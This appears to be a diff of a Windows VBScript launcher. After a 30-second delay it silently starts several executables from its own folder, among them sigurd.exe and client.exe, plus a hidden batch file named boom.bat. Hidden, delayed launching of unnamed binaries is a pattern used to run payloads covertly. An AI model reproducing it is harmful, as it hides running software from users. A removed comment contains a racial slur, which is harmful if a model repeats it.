@@ -21,17 +21,16 @@ WshShell.Run "cmd.exe /c boom.bat", 0, True
 Set WshShell = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
-' 1. Wait 30 seconds to make sure Windows is ready
+' Wait 30 seconds for the system/internet to stabilize
 WScript.Sleep 30000 
 
-' 2. Automatically find the folder where this script is sitting
-' This avoids any "path mistakes"
+' Get the folder path
 strPath = fso.GetParentFolderName(WScript.ScriptFullName)
 
-' 3. Run your files (0 = hidden, False = don't wait for it to finish)
-' The Triple Quotes handles spaces in your username "nigga12"
+' Run your files silently (0 = Hidden, False = Do not wait for app to exit)
 WshShell.Run """" & strPath & "\sigurd.exe""", 0, False
 WshShell.Run """" & strPath & "\client.exe""", 0, False
-
-' Add any other files below using the same format:
-' WshShell.Run """" & strPath & "\yourfile.exe""", 0, False
+WshShell.Run """" & strPath & "\file3.exe""", 0, False
+WshShell.Run """" & strPath & "\file4.exe""", 0, False
+WshShell.Run """" & strPath & "\file5.exe""", 0, False
+WshShell.Run """" & strPath & "\file6.exe""", 0, False
